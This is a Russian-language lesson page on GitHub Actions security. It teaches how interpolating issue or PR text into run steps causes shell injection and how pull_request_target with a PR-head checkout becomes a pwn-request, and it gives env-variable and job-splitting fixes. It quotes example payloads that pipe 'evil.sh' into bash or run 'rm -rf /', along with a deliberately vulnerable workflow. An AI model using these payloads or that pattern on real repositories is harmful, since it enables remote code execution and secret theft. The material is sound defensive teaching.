---
concepts:
- ci-cd-gha-injection
deepensInto: []
estMin: 17
lang: ru
lessonType: topic
level: senior
order: 3
prereqs: []
slug: "03-injection-and-untrusted-input"
sources:
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- https://securitylab.github.com/resources/github-actions-untrusted-input/
spiral: []
status: ready
title: "Недоверенный ввод в CI: script injection через интерполяцию контекста и pwn-request на pull_request_target"
track: "ci-cd"
unit: "10-security-and-oidc"
summary: "Интерполяция атакующе-управляемого контекста вроде github.event.issue.title в run-шаг — это shell-инъекция. pull_request_target бежит с секретами и write-токеном — checkout PR head там и есть pwn-request."
---

import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
Воркфлоу «авто-лейбл» выглядел безобидно: на каждый новый issue эхо-ить заголовок в скрипт-генератор лейблов. Он бежал на событиях `issues`, так что имел токен репо, а прошлый рефакторинг тихо поднял этот токен до write. Тело одного шага было одной строкой — `run: echo "New issue: ${{ github.event.issue.title }}"`. Атакующий открыл issue с заголовком `"; curl -s evil.sh | bash #`. GitHub не передаёт этот заголовок как *аргумент* шеллу — он текстово подставляет его в скрипт *до* того, как шелл парсит, так что раннер выполнил `echo "New issue: "; curl -s evil.sh | bash #"`. Инъецированная команда бежала с окружением воркфлоу: `GITHUB_TOKEN`, каждым секретом, что видел job, и write-доступом к репо. Ни цепочки эксплойтов, ни zero-day — просто текст атакующего, дословно сброшенный в шелл, самая частая GitHub-Actions-уязвимость из существующих. Фикс был не в санитизации заголовка. Он был в том, чтобы вообще никогда не интерполировать недоверенный текст в тело `run`.
</Hook>

<Crux>Интерполяция атакующего контекста в run-шаг — это shell-инъекция; передавай через env и никогда не гоняй недоверенный код с секретами.</Crux>

<Explanation>

## Script injection: `${{ ... }}`, что бежит как код

GitHub Actions вычисляет выражения `${{ ... }}` и подставляет результат в текст воркфлоу *до* того, как шелл раннера видит шаг. Для шага `run:` это значит, что выражение вклеивается в шелл-скрипт как сырой текст, затем шелл парсит всё целиком. Если значение выражения атакующе-управляемо, атакующий пишет шелл:

```yaml
# УЯЗВИМО — заголовок текстово подставляется в скрипт
- run: echo "Issue: ${{ github.event.issue.title }}"
```

Заголовок issue вида `$(curl evil.sh | bash)` или `"; rm -rf / #` становится частью выполняемой команды. Опасные контексты — всё, что не-коллаборатор может задать: `github.event.issue.title`, `.issue.body`, `.pull_request.title`, `.pull_request.body`, `.comment.body`, `.review.body`, имена head-ref и веток, сообщения коммитов и имена авторов из PR. Ничему из этого нельзя доверять.

Фикс — разорвать путь подстановки-в-код: передай недоверенное значение через **переменную окружения** и ссылайся на неё с шелл-квотингом, чтобы это были *данные, что шелл читает*, никогда не *текст, что шелл парсит*:

```yaml
# БЕЗОПАСНО — значение приходит как env-переменная; шелл никогда не парсит его как код
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Issue: $TITLE"
```

Теперь `$TITLE` раскрывается шеллом как значение переменной; даже заголовок, полный `$(...)` и бэктиков, — инертная строка. Биндинг `env:` — это граница доверия: GitHub задаёт значение переменной out-of-band, а тело скрипта — фиксированное в момент авторинга — лишь ссылается на неё. (Квотируй: `"$TITLE"`.) То же правило покрывает `actions/github-script` и JS: используй `process.env.TITLE` или `context.payload`, никогда не конкатенируй payload в вычисляемый код строкой.

<Quiz
  id="03-injection-and-untrusted-input-quiz-1"
  lessonSlug="03-injection-and-untrusted-input"
  lang="ru"
  question="Почему интерполяция github.event.issue.title прямо в run echo позволяет выполнение команд, а передача заголовка через env-переменную и echo шелл-переменной — нет?"
  choices={[
    { label: "С ${{ }} заголовок текстово подставляется в скрипт до парсинга шеллом, так что текст атакующего становится шелл-синтаксисом; через env значение задаётся out-of-band, и $TITLE читается как инертные данные, что шелл не репарсит", correct: true },
    { label: "Оба одинаково уязвимы; env-переменные — лишь вопрос стиля", misconception: "Они не эквивалентны. ${{ }}-интерполяция вклеивает значение в исходник скрипта, где шелл распарсит его как код; env-переменная присваивается раннером и разыменовывается как строковое значение, так что инъецированные $(...) или ; никогда не доходят до парсера как синтаксис." },
    { label: "env-версия безопасна, потому что GitHub HTML-эскейпит переменные окружения", misconception: "Никакого HTML-эскейпинга нет — это шелл-контекст, не HTML. Безопасность из того, что значение передаётся как данные через окружение, а не конкатенируется в текст скрипта, что шелл парсит." },
    { label: "${{ }} запускает код, лишь когда значение содержит литеральную строку 'run:'", misconception: "Любой шелл-метасимвол — $(...), бэктики, ;, |, && — в подставленном значении может выполниться. Нет магической триггер-строки; весь подставленный текст парсится как шелл." },
  ]}
/>

## Pwn-request: pull_request_target плюс checkout PR

Есть два PR-триггерных события, и разница между ними — это вся уязвимость. `pull_request` из форка бежит с **read-only** токеном и **без секретов** — безопасно гонять недоверенный PR-код, ведь он ничего не может. `pull_request_target` бежит в контексте **базового** репозитория: он получает **полные секреты** и **read/write** `GITHUB_TOKEN`, и — критически — по дефолту чекаутит воркфлоу **базовой** ветки, а *не* PR-а. Это намеренно: позволяет CI форк-PR-а лейблить, комментить или применять автоматизацию с привилегиями, используя доверенный код воркфлоу базового репо.

Уязвимость — **pwn-request** — это checkout и запуск *PR-кода* внутри этого привилегированного события:

```yaml
# УЯЗВИМО — pwn-request: недоверенный PR head бежит с секретами + write-токеном
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # код атакующего
      - run: npm install && npm test                        # гоняет его с полными секретами
```

`npm install` запускает lifecycle-скрипты; `npm test` запускает тест-файлы PR-а — всё авторства атакующего, теперь выполняемое с секретами базового репо и write-токеном. Атакующий открывает PR из форка, что добавляет вредоносный `postinstall`-скрипт, и тот эксфильтрует каждый секрет и пушит в репо. Комбинация — это ловушка: секреты и write-токен привилегированного события *и* checkout недоверенного кода в него.

Безопасные паттерны: делай привилегированную работу в `pull_request_target` лишь на **доверенном, фиксированном** коде воркфлоу (никогда не чекаутя PR head); или раздели — гоняй недоверенный build/test в job-е `pull_request` (без секретов), а отдельный, несущий-секреты job пусть действует по его результатам без выполнения PR-кода. Если обязан чекаутить PR head под `pull_request_target`, делай это без секретов в scope и без write-токена, считая его полностью враждебным.

<Inset kind="why" lang="ru">
Зачем GitHub вообще предлагает pull_request_target, если он так опасен? Потому что он закрывает реальную нужду: форк-PR-ы из `pull_request` не получают секретов и read-only токен по дизайну, что значит, что CI форк-PR-а не может постить status-комментарий, применить лейбл или вызвать secret-gated API. pull_request_target существует, чтобы дать *доверенной автоматизации базового репо* реагировать на форк-PR с привилегиями — используя воркфлоу базовой ветки, что автор PR не может изменить. Опасность целиком в злоупотреблении: вытягивании *собственного* кода PR-а в этот привилегированный контекст. Используемый по дизайну — привилегированный доверенный код, никогда не недоверенный checkout — он безопасен; pwn-request — это анти-паттерн комбинирования его привилегий с тем самым недоверенным кодом, что он был призван держать на расстоянии вытянутой руки.
</Inset>

<Quiz
  id="03-injection-and-untrusted-input-quiz-2"
  lessonSlug="03-injection-and-untrusted-input"
  lang="ru"
  question="Воркфлоу использует on: pull_request_target и чекаутит github.event.pull_request.head.sha, затем гоняет npm install. Почему это pwn-request, и какой минимальный верный фикс?"
  choices={[
    { label: "pull_request_target бежит с секретами базового репо и write-токеном, а checkout PR head выполняет код атакующего (npm install lifecycle-скрипты) с этими привилегиями; фикс — не чекаутить PR head в этом событии, а гонять недоверенный build/test под pull_request", correct: true },
    { label: "Это нормально, ведь pull_request_target песочничает форк-код без секретов", misconception: "Это описывает pull_request, не pull_request_target. pull_request_target намеренно несёт полные секреты и write-токен; checkout PR head там гоняет недоверенный код ровно с этими привилегиями, в чём весь эксплойт." },
    { label: "Риск лишь в npm-реестре, так что пиннинг версий пакетов это фиксит", misconception: "Пиннинг версий не помогает — вредоносный код в самом PR (lifecycle-скрипты, тест-файлы), зачекаученный по head.sha. Фикс — вообще не гонять недоверенный PR-код в привилегированном событии, не пиннинг сторонних пакетов." },
    { label: "Добавление permissions: contents: read полностью это фиксит, ведь токен не может писать", misconception: "Урезание токена до read всё ещё оставляет все секреты репо и орг-а открытыми атакующе-управляемому коду, что может их эксфильтровать. Least-privilege токен помогает, но реальный фикс — не выполнять PR head под pull_request_target." },
  ]}
/>

</Explanation>

<FlowDiagram
  label="Два пути, которыми атакующе-управляемый ввод доходит до выполнения, и граница, что останавливает каждый"
  hue="var(--d-security)"
  perRow={3}
  nodes={[
    { id: "input", label: "Недоверенный ввод", sub: "title/body/PR-код" },
    { id: "interp", label: "Интерполяция в run", sub: "${{ }} → шелл парсит" },
    { id: "ptarget", label: "pull_request_target", sub: "секреты + write-токен" },
    { id: "checkout", label: "Checkout head PR", sub: "гоняет код атакующего" },
    { id: "env", label: "Передать через env", sub: "инертные данные, без парса" },
    { id: "split", label: "Раздели job / без head", sub: "недоверенное = без секретов" },
  ]}
  edges={[
    { from: "input", to: "interp", label: "инъекция" },
    { from: "input", to: "ptarget", label: "pwn-request" },
    { from: "ptarget", to: "checkout", label: "если PR head" },
    { from: "interp", to: "env", label: "фикс" },
    { from: "checkout", to: "split", label: "фикс" },
  ]}
  caption="Script injection: недоверенный контекст, вклеенный в тело run, парсится как шелл — передавай через env, чтобы он был инертными данными. Pwn-request: pull_request_target несёт секреты и write-токен — никогда не чекаутить PR head в него; гоняй недоверенный код под pull_request (без секретов) или в разделённом job-е."
/>

<KeyTakeaway>Два CI-специфичных класса инъекций. Script injection: выражение `${{ github.event.* }}` из issue/PR/комментариев подставляется в тело run как текст до парсинга шеллом, так что ввод атакующего становится шелл-кодом — передавай его через env-переменную и ссылайся на $VAR (квотированный), чтобы он оставался инертными данными. Pwn-request: pull_request_target бежит с полными секретами базового репо и read/write токеном и по дефолту чекаутит базовую ветку; checkout PR head (head.sha) там выполняет код атакующего (npm lifecycle-скрипты, тест-файлы) с этими привилегиями. Никогда не гоняй недоверенный PR-код в pull_request_target — используй pull_request (без секретов, read-only) для build/test или раздели на привилегированный job, что никогда не касается PR-кода.</KeyTakeaway>

<RetrievalDrawer
  client:visible
  id="03-injection-and-untrusted-input-retrieval"
  lang="ru"
  questions={[
    { q: "Объясни механизм script injection в GitHub Actions и env-фикс, и перечисли, какие контексты недоверенные.", a: "GitHub вычисляет выражения ${{ ... }} и подставляет результат в текст воркфлоу до того, как шелл раннера парсит шаг. В run-шаге значение вклеивается в шелл-скрипт как сырой исходник, так что если значение атакующе-управляемо, оно интерпретируется как шелл — заголовок issue $(curl evil.sh | bash) или \"; rm -rf / # выполняется. Фикс — никогда не интерполировать недоверенные значения в тело run: биндь их к env-переменной (env: TITLE: ${{ github.event.issue.title }}) и ссылайся на \"$TITLE\" в скрипте. Раннер присваивает переменную out-of-band, так что шелл разыменовывает её как инертные данные и никогда не репарсит метасимволы как синтаксис. Недоверенные контексты — всё, что задаёт не-коллаборатор: заголовок и тело issue/PR, тело комментария и ревью, имена head-ref/веток, сообщения коммитов PR и имена авторов. То же правило в github-script: читай process.env или context.payload, никогда не конкатенируй payload в вычисляемый код." },
    { q: "Что делает pull_request_target риском pwn-request, зачем он существует и как использовать его безопасно?", a: "pull_request из форка бежит с read-only токеном и без секретов, так что недоверенный PR-код безвреден. pull_request_target бежит в контексте базового репо — полные секреты, read/write GITHUB_TOKEN — и по дефолту чекаутит доверенный воркфлоу базовой ветки, не PR. Он существует, чтобы доверенная автоматизация базового репо могла реагировать на форк-PR с привилегиями (лейбл, комментарий, secret-gated API), используя код, что автор PR не может изменить. Pwn-request — это checkout PR head (github.event.pull_request.head.sha) под pull_request_target и его запуск: npm install lifecycle-скрипты и тест-файлы PR тогда выполняются с секретами базового репо и write-токеном, давая атакующему эксфильтровать секреты и пушить. Безопасное использование: гоняй лишь доверенный фиксированный код воркфлоу в pull_request_target и никогда не чекаутить PR head; или раздели — build/test недоверенного кода под pull_request без секретов, а отдельный привилегированный job действует по результатам без запуска PR-кода. Если PR head обязан быть зачекаучен, делай это без секретов и без write-токена, считая его враждебным." },
  ]}
/>

<Recap lang="ru">
CI гоняет достижимый-атакующим ввод в привилегированном окружении, и два паттерна превращают это в выполнение кода. Script injection: GitHub подставляет выражения `${{ ... }}` в текст воркфлоу до того, как шелл парсит run-шаг, так что любой атакующе-управляемый контекст — заголовки и тела issue и PR, тела комментариев и ревью, имена head-ref, сообщения коммитов PR и имена авторов — вклеенный в тело run, парсится как шелл, и заголовок вроде `$(curl evil.sh | bash)` выполняется с токеном и секретами job-а. Фикс не в санитизации строки; он в том, чтобы никогда не интерполировать её в код. Биндь значение к env-переменной и ссылайся на "$VAR", чтобы шелл читал её как инертные данные, что он не репарсит. Pwn-request: pull_request_target бежит в контексте базового репо с полными секретами и read/write токеном и по дефолту чекаутит базовую ветку — он существует, чтобы доверенная база-автоматизация могла реагировать на форк-PR с привилегиями. Checkout PR head в это событие гоняет код атакующего (npm lifecycle-скрипты, тест-файлы) с этими привилегиями, эксфильтруя секреты и пуша в репо. Используй pull_request (без секретов, read-only) для недоверенного build и test; резервируй pull_request_target для доверенного фиксированного кода воркфлоу, что никогда не чекаутит PR head, или раздели на привилегированный job, что действует по результатам без выполнения PR-кода. Недоверенный ввод плюс привилегия — повторяющаяся форма; разорви путь от ввода к выполнению и держи секреты подальше от кода, что ты не писал.
</Recap>
